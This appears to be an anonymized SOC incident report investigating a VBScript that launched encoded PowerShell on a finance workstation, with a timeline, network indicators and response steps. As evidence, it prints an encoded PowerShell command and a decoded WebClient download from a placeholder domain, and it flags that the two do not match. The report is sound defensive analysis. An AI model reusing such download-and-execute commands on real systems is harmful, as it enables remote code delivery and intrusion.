# SOC Incident Investigation Report

> **Alert summary:** An alert was triggered after Windows Script Host (`wscript.exe`) launched PowerShell to execute encoded commands on workstation `FIN-LT-XXXX`. The activity was performed under the user account `CORP\\user` at `2026-08-07 07:42:43 UTC`.

> [!NOTE]
> **Public-portfolio copy:** Hostnames, usernames, domains, and IP addresses in this version have been anonymized. Replace these placeholders only in a private/internal copy where disclosure is authorized.

## 1. Incident Overview

| Field | Details |
|---|---|
| **Incident type** | Suspicious PowerShell Execution / Potential Malicious Script Activity |
| **Severity** | High (provisional) |
| **Affected host** | `FIN-LT-XXXX` |
| **Affected user** | `CORP\\user` |
| **Alert timestamp** | `2026-08-07 07:42:43 UTC` |
| **Status** | Under Investigation |

**Potential MITRE ATT&CK techniques**

- **T1059.001** — PowerShell
- **T1059.005** — Visual Basic
- **T1105** — Ingress Tool Transfer (requires further validation)

## 2. Executive Summary

An alert was triggered after PowerShell executed an encoded command on workstation `FIN-LT-XXXX` under the account `CORP\\user`. The PowerShell process was launched by Windows Script Host (`wscript.exe`), which executed a VBScript file named `review.vbs` from the user's Microsoft Templates directory.

The investigation identified suspicious outbound communication involving the anonymized domain `finance-sync.example.com`. Shortly after PowerShell execution, `curl.exe` accessed the same URL, followed by a DNS query and a network connection to an internal IP address.

Additionally, historical web activity from August 5, 2026, showed HTTP GET and POST requests involving the following application endpoints:

- `/finance/journals/submit`
- `/finance/accounts`

The available evidence suggests potentially suspicious script execution and possible unauthorized interaction with financial application resources. However, the relationship between the August 5 web activity and the August 7 endpoint activity has not yet been established.

No evidence of `review.vbs` file creation was identified in the available telemetry. Therefore, its origin and delivery mechanism remain unknown.

## 3. Technical Investigation and Timeline

### 3.1 Process Execution

**August 7, 2026**

| Timestamp (UTC) | Process / Event | Observation |
|---|---|---|
| 07:42:31 | `explorer.exe` → `wscript.exe` | Windows Script Host executed `review.vbs` from the user's Templates directory. |
| 07:42:43 | `powershell.exe` | PowerShell executed an encoded command with the `-NoProfile` parameter. |
| 07:42:57 | `curl.exe` | `curl.exe` accessed `https://finance-sync.example.com/api/v1/status`. |
| 07:42:59 | DNS query | A DNS query was generated for `finance-sync.example.com`. |
| 07:43:03 | Network connection | A connection was established to an internal IP address. The destination IP requires confirmation. |

### 3.2 Encoded PowerShell Command

The command recorded in the supplied investigation notes was:

```powershell
powershell.exe -NoProfile -EncodedCommand SQVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp
```

The decoded command was reported in the notes as:

```powershell
$wc = New-Object Net.WebClient
$wc.DownloadString('https://finance-sync.example.com/api/v1/status')
```

> [!WARNING]
> **Encoding validation required:** The Base64 value shown above does not decode to the PowerShell statement shown below it. The supplied value decodes to different, non-matching content. Verify the original command line in the source telemetry and update this section before treating the decoded command as confirmed evidence.

If the reported decoded command is confirmed, it creates a .NET `WebClient` object and uses it to retrieve content from the specified URL.

**Security relevance**

- Encoded PowerShell commands can be used to make command-line activity less readable during initial review.
- The .NET `WebClient` class can retrieve content from a remote URL.
- The destination domain requires reputation and ownership validation.
- The available evidence does not establish whether the retrieved content was subsequently executed.

### 3.3 Script Execution and File Creation

The following script was reported as executed:

```text
C:\Users\<user>\AppData\Roaming\Microsoft\Templates\review.vbs
```

The parent process was `explorer.exe`, which launched `wscript.exe`.

No evidence of `review.vbs` creation was identified in the available telemetry.

This leaves several unanswered questions regarding the script's origin, including whether it was downloaded, delivered through an email attachment, copied manually, or created by another process.

### 3.4 Network Activity

The investigation identified the following network-related events:

- DNS query for `finance-sync.example.com`.
- HTTP request to `https://finance-sync.example.com/api/v1/status` using `curl.exe`.
- An internal network connection at approximately 07:43:03 UTC.

The following IP addresses were identified in the supplied notes. They have been replaced with documentation-only example addresses in this public copy:

| IP address (anonymized) | Current understanding |
|---|---|
| `192.0.2.77` | Potential internal destination |
| `198.51.100.30` | Alternative possible destination |
| `203.0.113.42` | Identified user workstation IP |

The actual destination of the connection must be verified using the original network telemetry.

It is not yet established whether the connection represents internal lateral communication, communication with an internal service, or another type of network activity.

## 4. Potential Financial Application Activity

Historical web logs from August 5, 2026, at `15:42:20.835` showed requests involving the following endpoints:

- `/finance/journals/submit`
- `/finance/accounts`

Both GET and POST methods were observed.

These endpoints may provide access to financial account information and journal submission functionality.

The POST requests are particularly relevant because they may represent attempts to submit or modify financial records. However, the HTTP methods alone do not establish that any financial data was successfully modified.

Further investigation is required to determine:

- Which user or session generated the requests.
- Whether the requests were authenticated.
- What parameters or data were submitted.
- Whether the server returned successful responses.
- Whether any financial records were created or modified.
- Whether the August 5 activity is associated with the August 7 endpoint activity.

## 5. Initial Assessment

The investigation identified several suspicious observations:

1. Windows Script Host executed a VBScript from the user's Templates directory.
2. The script launched PowerShell with an encoded command.
3. PowerShell reportedly attempted to retrieve remote content using .NET `WebClient`; the command decoding must be validated against source telemetry.
4. `curl.exe` subsequently accessed the same external domain.
5. Network activity followed shortly after the script execution.
6. Historical web logs showed GET and POST requests to financial application endpoints.

The combination of script execution, encoded PowerShell commands, and remote content retrieval warrants further investigation.

However, the current evidence is insufficient to confirm the complete attack chain or establish a successful compromise of the financial application.

**Initial verdict:** Suspicious activity — requires further investigation.

## 6. Recommended Investigation and Response Actions

1. **Validate the script:** Recover `review.vbs` if available and examine its contents, metadata, and origin.
2. **Investigate process relationships:** Review the complete process tree, command-line arguments, process GUIDs, and associated execution events.
3. **Validate the domain:** Investigate `finance-sync.example.com` using available threat intelligence sources and DNS history.
4. **Confirm network destinations:** Verify the destination of the connection at 07:43:03 UTC using the original network telemetry.
5. **Correlate endpoint activity:** Search for the same domain, script name, PowerShell command, and related indicators across other endpoints.
6. **Investigate financial application logs:** Review authentication records, session identifiers, HTTP response codes, request parameters, and changes to financial records around August 5.
7. **Contact the user and IT department:** Confirm whether the script execution and financial application activity were authorized.
8. **Preserve evidence:** Retain relevant endpoint telemetry, process execution logs, DNS records, network connections, and application logs.
9. **Escalate to L2:** Escalate the incident for further investigation, particularly if unauthorized execution or financial application modifications are confirmed.

## 7. Conclusion

The investigation identified suspicious activity on workstation `FIN-LT-XXXX` involving Windows Script Host, encoded PowerShell execution, and communication with `finance-sync.example.com`.

Additionally, historical application logs revealed GET and POST requests to financial application endpoints, including journal submission and account-related resources.

Although these observations raise concerns about potential unauthorized activity, the available evidence does not yet establish whether the endpoint activity and historical financial application requests are related or whether financial records were modified.

The incident should remain open pending further investigation and validation by the L2 security team.
